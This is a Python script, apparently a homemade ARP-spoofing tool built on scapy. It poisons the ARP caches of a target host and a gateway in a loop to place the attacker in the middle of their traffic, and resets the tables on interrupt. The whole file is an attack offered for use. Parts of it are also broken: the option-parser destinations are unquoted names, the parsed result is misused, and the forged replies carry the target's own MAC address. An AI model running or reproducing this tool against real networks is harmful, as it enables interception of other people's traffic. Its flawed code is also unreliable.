import scapy.all as scapy
import time
import optparse as op

def get_mac(ip):
    requestPacket=scapy.ARP(pdst=ip)
    broadcastPacket=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket=broadcastPacket/requestPacket
    answered=scapy.srp(combinedPacket,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac=get_mac(target_ip)
    arpResponse=scapy.ARP(op=2, pdst=target_ip, hwsrc=target_mac, psrc=poisoned_ip)
    scapy.send(arpResponse,verbose=False)

def reset_poison(original_ip,router_ip):
    original_mac=get_mac(original_ip)
    router_mac=get_mac(router_ip)
    arpResponse=scapy.ARP(op=2,pdst=original_ip,hwdst=original_mac,psrc=router_ip,hwsrc=router_mac)
    scapy.send(arpResponse,timeout=1,verbose=False, count=6)

def getInput():
    parser=op.OptionParser()
    parser.add_option("-t","--target",dest=targetIp,help="use -t or --target to input target ip")
    parser.add_option("-r","--router",dest=routerIp,help="use -r or --router to input router/gateway ip")
    userInput=parser.parse_args()
    if not userInput.targetIp:
        print("please enter the target ip address.")
    if not userInput.routerIp:
        print("please enter the gateway ip address.")
    return userInput

number=0
user_ips=getInput()
target_ipAddr=user_ips.targetIp
router_ipAddr=user_ips.routerIp
try:
    while True:
        arp_poisoning(target_ipAddr, router_ipAddr)
        arp_poisoning(router_ipAddr, target_ipAddr)
        number +=2
        print("\r sending packets.."+str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quiting & Resetting ip address")
    reset_poison(target_ipAddr, router_ipAddr)
    reset_poison(router_ipAddr, target_ipAddr)